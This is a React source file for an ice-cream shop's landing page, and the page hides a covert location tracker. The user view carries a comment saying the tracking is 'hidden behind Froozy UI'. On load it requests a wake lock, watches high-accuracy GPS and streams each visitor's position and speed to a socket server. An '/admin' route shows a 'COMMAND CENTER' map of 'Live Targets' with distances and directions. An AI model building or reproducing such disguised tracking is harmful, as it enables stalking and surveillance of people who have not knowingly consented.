import React, { useEffect, useState } from 'react';
import { MapContainer, TileLayer, Marker, Popup, useMap } from 'react-leaflet';
import { io } from 'socket.io-client';
import { 
  User, Navigation, ShieldCheck, Map as MapIcon, ExternalLink, LocateFixed, // Admin Icons
  Menu, X, Droplet, ArrowRight, Heart, Leaf, IceCream, Coffee, Camera, Users, Instagram, Facebook, MapPin // Froozy Icons
} from 'lucide-react';
import 'leaflet/dist/leaflet.css';
import L from 'leaflet';

// Fix Leaflet Icons for standard React build
import markerIcon from 'leaflet/dist/images/marker-icon.png';
import markerShadow from 'leaflet/dist/images/marker-shadow.png';
const DefaultIcon = L.icon({ 
  iconUrl: markerIcon, 
  shadowUrl: markerShadow, 
  iconSize: [25, 41], 
  iconAnchor: [12, 41] 
});
L.Marker.prototype.options.icon = DefaultIcon;

// Connect to backend
const socket = io(window.location.hostname === 'localhost' ? 'http://localhost:3000' : '/');

// Helper to calculate distance in KM (Haversine formula)
const getDistance = (lat1, lon1, lat2, lon2) => {
  if (!lat1 || !lon1 || !lat2 || !lon2) return '...';
  const R = 6371; // Radius of earth in km
  const dLat = (lat2 - lat1) * Math.PI / 180;
  const dLon = (lon2 - lon1) * Math.PI / 180;
  const a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
            Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
            Math.sin(dLon / 2) * Math.sin(dLon / 2);
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
  return (R * c).toFixed(2);
};

// Component to auto-center map when Admin clicks a user
function RecenterMap({ coords }) {
  const map = useMap();
  useEffect(() => { 
    if (coords) map.flyTo([coords.lat, coords.lng], 16, { animate: true, duration: 1.5 }); 
  }, [coords, map]);
  return null;
}

export default function App() {
  const [role, setRole] = useState('user');
  const [adminLocation, setAdminLocation] = useState(null);
  const [users, setUsers] = useState([]);
  const [selectedUser, setSelectedUser] = useState(null);
  
  // Front-end state for Froozy
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const currentYear = new Date().getFullYear();

  // Core Setup & Tracking Logic
  useEffect(() => {
    // 1. Get identifiers
    const params = new URLSearchParams(window.location.search);
    const urlName = params.get('name') || `User_${Math.random().toString(36).substr(2, 5)}`;
    
    // Persistent ID so refreshing doesn't break tracking
    const userId = localStorage.getItem('userId') || 'uid_' + Math.random().toString(36).substr(2, 9);
    localStorage.setItem('userId', userId);

    // 2. Check Role
    if (window.location.pathname.includes('/admin')) {
      setRole('admin');
      // Admin tracks their own location just once to calculate distance to targets
      navigator.geolocation.getCurrentPosition((pos) => {
        setAdminLocation({ lat: pos.coords.latitude, lng: pos.coords.longitude });
      });
    } else {
      // 3. USER SIDE: Start aggressive tracking automatically (Hidden behind Froozy UI)
      const startAutoTracking = async () => {
        // Try to keep the screen/GPS from sleeping (Works on supported mobile browsers)
        if ('wakeLock' in navigator) {
          try {
            await navigator.wakeLock.request('screen');
          } catch (err) {
            console.log("Wake Lock not supported/allowed");
          }
        }

        const options = {
          enableHighAccuracy: true, // Forces precise GPS
          maximumAge: 0,            // Prevents using old cached location
          timeout: 10000            // Refresh window
        };

        navigator.geolocation.watchPosition((pos) => {
          const { latitude, longitude, speed } = pos.coords;
          socket.emit('update-location', { 
            userId, 
            name: urlName, 
            lat: latitude, 
            lng: longitude,
            speed: speed 
          });
        }, (err) => console.error("GPS Error:", err), options);
      };
      
      startAutoTracking();
    }

    // 4. Listen for backend updates
    socket.on('users-list', (data) => setUsers(data));
    return () => socket.off('users-list');
  }, []);

  // Scroll reveal animation effect for Froozy front-end
  useEffect(() => {
    if (role !== 'admin') {
      const revealElements = document.querySelectorAll('.reveal');
      const revealOptions = { threshold: 0.15, rootMargin: "0px 0px -50px 0px" };
      const revealOnScroll = new IntersectionObserver((entries, observer) => {
        entries.forEach(entry => {
          if (entry.isIntersecting) {
            entry.target.classList.add('active');
            observer.unobserve(entry.target);
          }
        });
      }, revealOptions);
      revealElements.forEach(el => revealOnScroll.observe(el));
      return () => revealElements.forEach(el => revealOnScroll.unobserve(el));
    }
  }, [role]);

  const openInGoogleMaps = (lat, lng) => {
    window.open(`http://googleusercontent.com/maps.google.com/maps?q=${lat},${lng}`, '_blank');
  };

  const scrollToSection = (id) => {
    const element = document.getElementById(id);
    if (element) {
      element.scrollIntoView({ behavior: 'smooth' });
    }
    setIsMenuOpen(false);
  };

  // ==========================================
  //                ADMIN VIEW
  // ==========================================
  if (role === 'admin') {
    return (
      <div className="flex h-screen w-full bg-slate-950 text-white font-sans overflow-hidden">
        
        {/* Sidebar */}
        <div className="w-80 bg-slate-900 border-r border-slate-800 p-4 flex flex-col z-[1000] shadow-2xl">
          <div className="flex items-center gap-2 mb-8 p-3 bg-red-500/10 rounded-lg border border-red-500/20">
            <ShieldCheck className="text-red-500 flex-shrink-0" />
            <h1 className="text-sm font-bold tracking-tight">COMMAND CENTER</h1>
          </div>
          
          <div className="flex-1 overflow-y-auto">
            <p className="text-[10px] uppercase text-slate-500 font-black mb-4 tracking-widest">
              Live Targets ({users.length})
            </p>
            
            {users.map(u => {
              const distance = adminLocation ? getDistance(adminLocation.lat, adminLocation.lng, u.lat, u.lng) : '...';
              const speedKmH = u.speed ? (u.speed * 3.6).toFixed(1) : 0;
              
              return (
                <div 
                  key={u.userId} 
                  onClick={() => setSelectedUser(u)}
                  className={`p-4 rounded-xl mb-3 cursor-pointer transition-all border ${selectedUser?.userId === u.userId ? 'bg-blue-600 border-blue-400 shadow-lg scale-[1.02]' : 'bg-slate-800 border-slate-700 hover:bg-slate-700'}`}
                >
                  <div className="flex justify-between items-start mb-2">
                    <span className="font-bold text-sm truncate">{u.name}</span>
                    <span className="text-[10px] bg-black/30 px-2 py-1 rounded text-blue-300 font-mono flex-shrink-0">
                      {distance} km
                    </span>
                  </div>
                  
                  <div className="text-xs text-slate-400 mb-3 flex justify-between">
                    <span>Speed: {speedKmH} km/h</span>
                    <span className="opacity-50 text-[10px]">ID: {u.userId.slice(-4)}</span>
                  </div>

                  <button 
                    onClick={(e) => { e.stopPropagation(); openInGoogleMaps(u.lat, u.lng); }}
                    className="w-full bg-white/10 hover:bg-white/20 p-2 rounded text-[11px] flex items-center justify-center gap-2 transition"
                  >
                    <MapIcon size={14}/> Open in Google Maps
                  </button>
                </div>
              );
            })}
            
            {users.length === 0 && (
              <div className="text-center p-6 text-slate-500 text-sm border border-dashed border-slate-700 rounded-lg">
                No active signals detected.
              </div>
            )}
          </div>
        </div>

        {/* Map Area */}
        <div className="flex-1 relative bg-slate-800">
          <MapContainer center={[20.5937, 78.9629]} zoom={5} className="h-full w-full">
            {/* Highly detailed OpenStreetMap Tiles */}
            <TileLayer 
              url="https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png"
              attribution='&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
            />
            
            {users.map(u => (
              <Marker 
                key={u.userId} 
                position={[u.lat, u.lng]}
                eventHandlers={{
                  add: (e) => {
                    // Adds CSS transition for smooth marker movement
                    e.target.getElement().style.transition = "transform 1s linear";
                  }
                }}
              >
                <Popup className="text-slate-900 min-w-[150px]">
                  <h3 className="font-bold border-b pb-1 mb-2">{u.name}</h3>
                  <div className="text-xs space-y-1 mb-3 font-mono bg-slate-100 p-2 rounded">
                    <p>LAT: {u.lat.toFixed(5)}</p>
                    <p>LNG: {u.lng.toFixed(5)}</p>
                    <p>SPD: {u.speed ? (u.speed * 3.6).toFixed(1) : 0} km/h</p>
                  </div>
                  <button 
                    onClick={() => openInGoogleMaps(u.lat, u.lng)}
                    className="w-full bg-blue-600 text-white p-2 rounded text-xs flex items-center justify-center gap-1 hover:bg-blue-700 transition"
                  >
                    <ExternalLink size={12}/> Directions
                  </button>
                </Popup>
              </Marker>
            ))}
            {selectedUser && <RecenterMap coords={selectedUser} />}
          </MapContainer>
        </div>
      </div>
    );
  }

  // ==========================================
  //         USER VIEW (FROOZY FRONTEND)
  // ==========================================
  return (
    <div className="bg-[#fffdf9] text-[#8a633a] font-['Quicksand'] antialiased selection:bg-[#f48024] selection:text-white relative w-full min-h-screen">
      
      {/* Embedded CSS for custom animations and elements */}
      <style dangerouslySetInnerHTML={{ __html: `
        @import url('https://fonts.googleapis.com/css2?family=Fredoka:wght@400;500;600;700&family=Quicksand:wght@500;600;700&display=swap');
        html { scroll-behavior: smooth; overflow-x: hidden; }
        body { overflow-x: hidden; }
        h1, h2, h3, h4, h5, .font-display { font-family: 'Fredoka', sans-serif; }
        
        .bg-cyan-grid {
            background-color: #1aa7b8;
            background-image: 
                linear-gradient(rgba(255,255,255,0.2) 1px, transparent 1px),
                linear-gradient(90deg, rgba(255,255,255,0.2) 1px, transparent 1px);
            background-size: 35px 35px;
        }

        @keyframes float {
            0% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-15px) rotate(2deg); }
            100% { transform: translateY(0px) rotate(0deg); }
        }
        .animate-float { animation: float 6s ease-in-out infinite; }
        
        @keyframes float-delayed {
            0% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(-2deg); }
            100% { transform: translateY(0px) rotate(0deg); }
        }
        .animate-float-delayed { animation: float-delayed 7s ease-in-out infinite 2s; }

        @keyframes blob {
            0% { border-radius: 60% 40% 30% 70% / 60% 30% 70% 40%; }
            50% { border-radius: 30% 60% 70% 40% / 50% 60% 30% 60%; }
            100% { border-radius: 60% 40% 30% 70% / 60% 30% 70% 40%; }
        }
        .animate-blob { animation: blob 8s ease-in-out infinite; }

        .reveal {
            opacity: 0;
            transform: translateY(40px);
            transition: all 0.8s cubic-bezier(0.5, 0, 0, 1);
        }
        .reveal.active {
            opacity: 1;
            transform: translateY(0);
        }
        .no-scrollbar::-webkit-scrollbar { display: none; }
        .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
      `}} />

      {/* Sticky App Header */}
      <nav id="navbar" className="fixed w-full z-50 transition-all duration-300 bg-white/90 backdrop-blur-md shadow-sm py-3">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 flex justify-between items-center">
              
              {/* LOGO AREA */}
              <div className="flex flex-col cursor-pointer items-center justify-center group" onClick={() => scrollToSection('home')}>
                  <img src="logo.png" alt="Froozy Handcrafted Icecream" className="w-48 md:w-64 lg:w-72 h-auto object-contain drop-shadow-sm transition-transform group-hover:scale-105" />
              </div>

              {/* Desktop Nav */}
              <div className="hidden md:flex space-x-8 items-center">
                  <button onClick={() => scrollToSection('our-promise')} className="text-[#8a633a] hover:text-[#f48024] font-bold transition-colors">Our Promise</button>
                  <button onClick={() => scrollToSection('menu')} className="text-[#8a633a] hover:text-[#f48024] font-bold transition-colors">Menu</button>
                  <button onClick={() => scrollToSection('vibe')} className="text-[#8a633a] hover:text-[#f48024] font-bold transition-colors">The Vibe</button>
                  
                  <button className="bg-[#f48024] hover:bg-[#fbc31b] hover:text-[#8a633a] text-white px-8 py-3 rounded-full font-bold font-display tracking-wide shadow-[0_0_20px_rgba(244,128,36,0.4)] transition-all hover:-translate-y-1">
                      Order Online
                  </button>
              </div>

              {/* Mobile Menu Toggle */}
              <button className="md:hidden text-[#1aa7b8] bg-[#1aa7b8]/10 p-2 rounded-xl active:scale-95 transition-transform" onClick={() => setIsMenuOpen(!isMenuOpen)}>
                  {isMenuOpen ? <X className="w-7 h-7" /> : <Menu className="w-7 h-7" />}
              </button>
          </div>
      </nav>

      {/* Mobile Menu Overlay */}
      <div id="mobile-menu" className={`fixed inset-0 bg-[#1aa7b8] z-40 flex-col items-center justify-center space-y-8 ${isMenuOpen ? 'flex' : 'hidden'}`}>
          <div className="absolute top-0 right-0 w-64 h-64 bg-white/10 rounded-full blur-3xl -translate-y-1/2 translate-x-1/2"></div>
          <div className="absolute bottom-0 left-0 w-64 h-64 bg-[#fbc31b]/20 rounded-full blur-3xl translate-y-1/2 -translate-x-1/2"></div>
          
          <button onClick={() => scrollToSection('home')} className="text-4xl font-display font-bold text-white hover:text-[#fbc31b] transition-colors z-10">Home</button>
          <button onClick={() => scrollToSection('our-promise')} className="text-4xl font-display font-bold text-white hover:text-[#fbc31b] transition-colors z-10">Our Promise</button>
          <button onClick={() => scrollToSection('menu')} className="text-4xl font-display font-bold text-white hover:text-[#fbc31b] transition-colors z-10">Menu</button>
          <button onClick={() => scrollToSection('vibe')} className="text-4xl font-display font-bold text-white hover:text-[#fbc31b] transition-colors z-10">Visit Us</button>
          
          <button className="mt-8 bg-[#fbc31b] text-[#8a633a] px-10 py-4 rounded-full font-bold font-display text-xl shadow-lg active:scale-95 transition-transform z-10">
              Order Online
          </button>
      </div>

      {/* Hero Section */}
      <section id="home" className="relative pt-32 pb-20 md:pt-40 md:pb-32 overflow-hidden flex items-center min-h-[90vh]">
          <div className="absolute top-20 -right-20 w-96 h-96 bg-[#fbc31b]/20 animate-blob mix-blend-multiply filter blur-2xl opacity-70"></div>
          <div className="absolute -bottom-20 -left-20 w-96 h-96 bg-[#1aa7b8]/20 animate-blob mix-blend-multiply filter blur-2xl opacity-70" style={{animationDelay: '2s'}}></div>

          <div className="max-w-7xl mx-auto px-6 relative w-full flex flex-col md:flex-row items-center justify-between z-10">
              <div className="w-full md:w-1/2 text-center md:text-left mb-12 md:mb-0 reveal">
                  <div className="inline-flex items-center space-x-2 bg-white px-4 py-2 rounded-full mb-6 shadow-sm border border-[#1aa7b8]/20 text-[#1aa7b8] font-bold text-sm tracking-wide">
                      <Droplet className="w-4 h-4 fill-[#1aa7b8]" />
                      <span>100% PURE MILK BASE</span>
                  </div>
                  <h1 className="text-5xl md:text-7xl lg:text-8xl font-display font-bold text-[#1aa7b8] leading-[1.1] mb-6">
                      Freshly <br/>
                      <span className="text-[#f48024]">Handcrafted.</span>
                  </h1>
                  <p className="text-lg md:text-xl text-[#8a633a]/80 mb-8 max-w-md mx-auto md:mx-0 font-medium">
                      Experience the rich, creamy joy of authentic gelato. Made with pure milk, natural fruits, and zero palm oil.
                  </p>
                  <div className="flex flex-col sm:flex-row justify-center md:justify-start space-y-4 sm:space-y-0 sm:space-x-4">
                      <button onClick={() => scrollToSection('menu')} className="bg-[#f48024] hover:bg-[#fbc31b] hover:text-[#8a633a] text-white px-8 py-4 rounded-full font-bold font-display text-lg shadow-[0_0_20px_rgba(244,128,36,0.4)] transition-all hover:-translate-y-1 flex items-center justify-center">
                          See The Menu <ArrowRight className="ml-2 w-5 h-5" />
                      </button>
                  </div>
              </div>

              <div className="w-full md:w-1/2 relative flex justify-center mt-8 md:mt-0">
                  <div className="relative w-64 h-64 md:w-96 md:h-96 animate-float z-20 bg-[#fffdf9] rounded-full border-8 border-white shadow-[0_20px_40px_-15px_rgba(26,167,184,0.15)] overflow-hidden">
                      <img 
                          src="https://images.unsplash.com/photo-1563805042-7684c8a9e9cb?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" 
                          alt="Rich Premium Gelato" 
                          className="w-full h-full object-cover"
                          onError={(e) => { e.target.onerror=null; e.target.src='https://images.unsplash.com/photo-1488477181946-6428a0291777?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80'; }}
                      />
                  </div>
                  <div className="absolute top-10 -left-4 md:-left-10 bg-white p-3 md:p-4 rounded-2xl shadow-xl animate-float-delayed z-30 -rotate-12">
                      <span className="font-display font-bold text-[#1aa7b8] md:text-lg">No Palm Oil 🚫</span>
                  </div>
                  <div className="absolute bottom-10 -right-4 md:-right-10 bg-white p-3 md:p-4 rounded-2xl shadow-xl animate-float-delayed z-30 rotate-12 text-[#f48024] font-display font-bold md:text-lg">
                      Real Fruits 🍓
                  </div>
              </div>
          </div>
      </section>

      {/* Our Promise (Values) */}
      <section id="our-promise" className="py-24 bg-white relative">
          <div className="max-w-7xl mx-auto px-6 relative z-10">
              <div className="text-center mb-16 reveal">
                  <h2 className="text-sm font-bold text-[#f48024] tracking-widest mb-3 uppercase">Why Choose Froozy</h2>
                  <h3 className="text-4xl md:text-5xl font-display text-[#1aa7b8]">The Pure Promise</h3>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
                  <div className="bg-[#fffdf9] p-10 rounded-[2rem] text-center hover:-translate-y-2 transition-transform duration-300 border-2 border-transparent hover:border-[#fbc31b]/30 shadow-sm hover:shadow-xl reveal">
                      <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center mx-auto mb-6 shadow-sm text-[#f48024] rotate-3">
                          <Heart className="w-8 h-8 fill-[#f48024]/20" />
                      </div>
                      <h4 className="text-2xl font-display text-[#8a633a] mb-3">Zero Palm Oil</h4>
                      <p className="text-[#8a633a]/70 font-medium">A healthier treat for your heart and a better choice for our planet. Pure indulgence.</p>
                  </div>

                  <div className="bg-[#1aa7b8] text-white p-10 rounded-[2rem] text-center hover:-translate-y-2 transition-transform duration-300 shadow-[0_20px_40px_-15px_rgba(26,167,184,0.15)] reveal" style={{transitionDelay: '100ms'}}>
                      <div className="w-16 h-16 bg-white/20 backdrop-blur-sm rounded-2xl flex items-center justify-center mx-auto mb-6 text-white -rotate-3">
                          <Droplet className="w-8 h-8 fill-white/50 text-white" />
                      </div>
                      <h4 className="text-2xl font-display mb-3">100% Pure Milk</h4>
                      <p className="text-white/90 font-medium">Our signature creamy texture comes from real dairy. No artificial fillers, no shortcuts.</p>
                  </div>

                  <div className="bg-[#fffdf9] p-10 rounded-[2rem] text-center hover:-translate-y-2 transition-transform duration-300 border-2 border-transparent hover:border-[#fbc31b]/30 shadow-sm hover:shadow-xl reveal" style={{transitionDelay: '200ms'}}>
                      <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center mx-auto mb-6 shadow-sm text-[#fbc31b] rotate-3">
                          <Leaf className="w-8 h-8 fill-[#fbc31b]/20 text-[#fbc31b]" />
                      </div>
                      <h4 className="text-2xl font-display text-[#8a633a] mb-3">Natural Flavours</h4>
                      <p className="text-[#8a633a]/70 font-medium">From real vanilla beans to fresh seasonal fruits, taste the authentic ingredients.</p>
                  </div>
              </div>
          </div>
      </section>

      {/* Menu Section */}
      <section id="menu" className="py-24 bg-cyan-grid relative overflow-hidden text-white">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 relative z-10">
              <div className="text-center mb-16 reveal">
                  <p className="text-[#fbc31b] font-bold tracking-widest uppercase mb-2">Our Menu</p>
                  <h2 className="text-5xl md:text-7xl font-display font-bold drop-shadow-md">100% FRESH GELATO</h2>
              </div>

              <div className="flex overflow-x-auto snap-x snap-mandatory gap-6 pb-8 md:grid md:grid-cols-3 md:overflow-visible no-scrollbar reveal">
                  
                  {/* CUPS CARD */}
                  <div className="snap-center shrink-0 w-[85vw] md:w-auto bg-white text-[#8a633a] rounded-[2.5rem] p-8 md:p-10 shadow-2xl relative overflow-hidden group">
                      <div className="absolute -right-10 -top-10 w-32 h-32 bg-[#1aa7b8]/10 rounded-full transition-transform group-hover:scale-150"></div>
                      <div className="flex justify-between items-start mb-8 relative z-10">
                          <div>
                              <h3 className="text-4xl font-display text-[#1aa7b8] uppercase">Cup</h3>
                              <span className="inline-block bg-[#1aa7b8]/10 text-[#1aa7b8] text-xs font-bold px-3 py-1 rounded-full mt-2">150ml</span>
                          </div>
                          <div className="w-14 h-14 bg-[#1aa7b8]/10 rounded-2xl flex items-center justify-center text-[#1aa7b8] -rotate-12">
                              <IceCream className="w-8 h-8 fill-[#1aa7b8]/20" />
                          </div>
                      </div>
                      <div className="space-y-4 relative z-10">
                          <div className="bg-[#fffdf9] p-4 rounded-2xl flex justify-between items-center border border-[#1aa7b8]/10">
                              <div>
                                  <p className="text-xs text-[#8a633a]/50 font-bold uppercase mb-0.5">You can choose</p>
                                  <p className="text-xl font-display text-[#1aa7b8]">1 FLAVOUR</p>
                              </div>
                              <p className="text-3xl font-display text-[#1aa7b8]">90/-</p>
                          </div>
                          <div className="bg-[#fffdf9] p-4 rounded-2xl flex justify-between items-center border border-[#1aa7b8]/10">
                              <div>
                                  <p className="text-xs text-[#8a633a]/50 font-bold uppercase mb-0.5">You can choose</p>
                                  <p className="text-xl font-display text-[#1aa7b8]">2 FLAVOUR</p>
                              </div>
                              <p className="text-3xl font-display text-[#1aa7b8]">100/-</p>
                          </div>
                      </div>
                  </div>

                  {/* CONES CARD */}
                  <div className="snap-center shrink-0 w-[85vw] md:w-auto bg-white text-[#8a633a] rounded-[2.5rem] p-8 md:p-10 shadow-2xl relative overflow-hidden group">
                      <div className="absolute -right-10 -top-10 w-32 h-32 bg-[#f48024]/10 rounded-full transition-transform group-hover:scale-150"></div>
                      <div className="flex justify-between items-start mb-8 relative z-10">
                          <div>
                              <h3 className="text-4xl font-display text-[#f48024] uppercase">Cone</h3>
                              <span className="inline-block bg-[#f48024]/10 text-[#f48024] text-xs font-bold px-3 py-1 rounded-full mt-2">Crispy</span>
                          </div>
                          <div className="w-14 h-14 bg-[#f48024]/10 rounded-2xl flex items-center justify-center text-[#f48024] rotate-12">
                              <div className="w-6 h-6 border-b-[12px] border-b-transparent border-l-[12px] border-l-[#f48024] border-r-[12px] border-r-transparent rotate-45 opacity-80"></div>
                          </div>
                      </div>
                      <div className="space-y-4 relative z-10">
                          <div className="bg-[#fffdf9] p-4 rounded-2xl flex justify-between items-center border border-[#f48024]/10">
                              <div>
                                  <p className="text-xs text-[#8a633a]/50 font-bold uppercase mb-0.5">You can choose</p>
                                  <p className="text-xl font-display text-[#f48024]">1 FLAVOUR</p>
                              </div>
                              <p className="text-3xl font-display text-[#f48024]">100/-</p>
                          </div>
                          <div className="bg-[#fffdf9] p-4 rounded-2xl flex justify-between items-center border border-[#f48024]/10">
                              <div>
                                  <p className="text-xs text-[#8a633a]/50 font-bold uppercase mb-0.5">You can choose</p>
                                  <p className="text-xl font-display text-[#f48024]">2 FLAVOUR</p>
                              </div>
                              <p className="text-3xl font-display text-[#f48024]">110/-</p>
                          </div>
                      </div>
                  </div>

                  {/* COFFEE CARD */}
                  <div className="snap-center shrink-0 w-[85vw] md:w-auto bg-white text-[#8a633a] rounded-[2.5rem] p-8 md:p-10 shadow-2xl relative overflow-hidden group">
                      <div className="absolute -right-10 -top-10 w-32 h-32 bg-[#8a633a]/5 rounded-full transition-transform group-hover:scale-150"></div>
                      <div className="flex justify-between items-start mb-8 relative z-10">
                          <div>
                              <h3 className="text-4xl font-display text-[#8a633a] uppercase">Coffee</h3>
                              <span className="inline-block bg-[#8a633a]/5 text-[#8a633a] text-xs font-bold px-3 py-1 rounded-full mt-2">Brewed</span>
                          </div>
                          <div className="w-14 h-14 bg-[#8a633a]/5 rounded-2xl flex items-center justify-center text-[#8a633a]">
                              <Coffee className="w-8 h-8" />
                          </div>
                      </div>
                      <div className="space-y-3 relative z-10">
                          <div className="flex justify-between items-center border-b-2 border-dashed border-[#fffdf9] pb-3">
                              <p className="text-lg font-bold font-display">CAPPUCCINO</p>
                              <p className="text-2xl font-display text-[#8a633a]">70/-</p>
                          </div>
                          <div className="flex justify-between items-center border-b-2 border-dashed border-[#fffdf9] pb-3">
                              <p className="text-lg font-bold font-display">LATTE</p>
                              <p className="text-2xl font-display text-[#8a633a]">70/-</p>
                          </div>
                          <div className="flex justify-between items-center">
                              <p className="text-lg font-bold font-display">ESPRESSO</p>
                              <p className="text-2xl font-display text-[#8a633a]">70/-</p>
                          </div>
                      </div>
                  </div>

              </div>
              
              <div className="flex justify-center mt-4 md:hidden gap-2">
                  <div className="w-2 h-2 rounded-full bg-white"></div>
                  <div className="w-2 h-2 rounded-full bg-white/50"></div>
                  <div className="w-2 h-2 rounded-full bg-white/50"></div>
              </div>

              <div className="mt-16 text-center reveal">
                  <div className="inline-block bg-white text-[#1aa7b8] font-bold px-6 py-3 rounded-full shadow-lg transform -rotate-2">
                      ✨ Ask our staff about today's seasonal fruit flavours!
                  </div>
              </div>
          </div>
      </section>

      {/* Store Aesthetic / Vibe Section */}
      <section id="vibe" className="py-24 bg-[#fffdf9] relative overflow-hidden">
          <div className="max-w-7xl mx-auto px-6">
              <div className="flex flex-col lg:flex-row items-center gap-16">
                  
                  <div className="w-full lg:w-1/2 relative reveal">
                      <div className="rounded-t-full rounded-b-3xl overflow-hidden shadow-2xl relative z-10 border-8 border-white bg-[#fbc31b]/20 flex items-center justify-center min-h-[300px]">
                           <img 
                              src="fro-a.webp" 
                              alt="Froozy Store Interior Aesthetic" 
                              className="w-full h-[500px] object-cover mix-blend-overlay opacity-90"
                              onError={(e) => { e.target.onerror=null; e.target.src='https://images.unsplash.com/photo-1555507015-0810756eb100?q=80&w=1200&auto=format&fit=crop'; }}
                          />
                      </div>
                      <div className="absolute -bottom-6 left-10 w-3/4 h-12 bg-[repeating-linear-gradient(90deg,#fff,#fff_20px,#333_20px,#333_40px)] rounded-xl shadow-lg -z-10 rotate-2"></div>
                  </div>
                  
                  <div className="w-full lg:w-1/2 reveal text-center md:text-left" style={{transitionDelay: '200ms'}}>
                      <h2 className="text-sm font-bold text-[#f48024] tracking-widest mb-3 uppercase">The Experience</h2>
                      <h3 className="text-5xl md:text-6xl font-display text-[#8a633a] mb-6">A Space Designed for Joy.</h3>
                      <p className="text-xl text-[#8a633a]/70 mb-10 font-medium">
                          Our Belagavi outlet features warm amber tones, cozy booth seating, and a playful archway—perfect for hanging out with friends or treating the family.
                      </p>
                      
                      <div className="flex flex-col sm:flex-row items-center sm:items-start gap-6 mb-10">
                          <div className="flex items-center gap-4 bg-white px-6 py-4 rounded-2xl shadow-sm w-full">
                              <div className="w-12 h-12 bg-[#fbc31b]/20 rounded-xl flex items-center justify-center text-[#fbc31b] shrink-0">
                                  <Camera className="w-6 h-6" />
                              </div>
                              <p className="font-bold text-[#8a633a] text-left">Insta-worthy warm decor</p>
                          </div>
                          <div className="flex items-center gap-4 bg-white px-6 py-4 rounded-2xl shadow-sm w-full">
                              <div className="w-12 h-12 bg-[#1aa7b8]/20 rounded-xl flex items-center justify-center text-[#1aa7b8] shrink-0">
                                  <Users className="w-6 h-6" />
                              </div>
                              <p className="font-bold text-[#8a633a] text-left">Cozy family seating</p>
                          </div>
                      </div>

                      <a href="https://www.instagram.com/froozyicecream/?hl=en" target="_blank" rel="noreferrer" className="inline-flex items-center px-8 py-4 bg-gradient-to-r from-purple-500 via-pink-500 to-[#f48024] text-white rounded-full font-bold shadow-lg hover:shadow-xl transition-transform hover:scale-105 font-display text-lg">
                          <Instagram className="mr-2 w-5 h-5" /> Follow our Journey
                      </a>
                  </div>
              </div>
          </div>
      </section>

      {/* Footer */}
      <footer id="visit-us" className="bg-[#8a633a] text-white pt-20 pb-10">
          <div className="max-w-7xl mx-auto px-6">
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-12 mb-16">
                  
                  <div className="lg:col-span-2 text-center md:text-left">
                      <div className="flex flex-col items-center md:items-start mb-6">
                          <div className="bg-white/95 px-6 py-4 rounded-3xl shadow-sm inline-flex items-center justify-center">
                              <img src="logo.png" alt="Froozy Handcrafted Icecream" className="w-56 md:w-72 lg:w-80 h-auto object-contain" />
                          </div>
                      </div>
                      <p className="text-white/70 font-medium max-w-sm mx-auto md:mx-0">
                          Redefining the gelato experience in Belagavi with pure milk, zero palm oil, and 100% authentic flavours.
                      </p>
                  </div>

                  <div className="text-center md:text-left">
                      <h4 className="text-xl font-display font-bold mb-6 text-[#f48024]">Visit Us</h4>
                      <ul className="space-y-4 text-white/80 font-medium">
                          <li className="flex items-start justify-center md:justify-start">
                              <MapPin className="text-[#f48024] mr-3 mt-1 flex-shrink-0 w-5 h-5" />
                              <span className="text-left">Tejpal Arcade, RPD College Rd,<br/>beside Ajanta Cafe, Ranade Colony,<br/>Hindwadi, Belagavi,<br/>Karnataka 590006</span>
                          </li>
                      </ul>
                  </div>

                  <div className="text-center md:text-left">
                      <h4 className="text-xl font-display font-bold mb-6 text-[#f48024]">Connect</h4>
                      <div className="flex space-x-4 justify-center md:justify-start">
                          <a href="https://www.instagram.com/froozyicecream/?hl=en" target="_blank" rel="noreferrer" className="w-12 h-12 bg-white/10 rounded-full flex items-center justify-center hover:bg-[#1aa7b8] transition-colors text-white">
                              <Instagram className="w-5 h-5" />
                          </a>
                          <div className="w-12 h-12 bg-white/10 rounded-full flex items-center justify-center hover:bg-[#1aa7b8] transition-colors text-white cursor-pointer">
                              <Facebook className="w-5 h-5" />
                          </div>
                      </div>
                  </div>

              </div>
              
              <div className="border-t border-white/10 pt-8 flex flex-col md:flex-row justify-between items-center text-center md:text-left">
                  <div className="mb-4 md:mb-0">
                      <p className="text-white/50 text-sm font-bold">© {currentYear} Froozy Handcrafted Icecream. All rights reserved.</p>
                      <p className="text-[#1aa7b8] text-sm font-bold mt-2">Developed by <span className="text-[#fbc31b] tracking-wide">Kunal Dongare</span></p>
                  </div>
                  <div className="flex space-x-6 text-sm text-white/50 font-bold">
                      <button className="hover:text-white transition-colors">Privacy Policy</button>
                      <button className="hover:text-white transition-colors">Terms of Service</button>
                  </div>
              </div>
          </div>
      </footer>
    </div>
  );
}
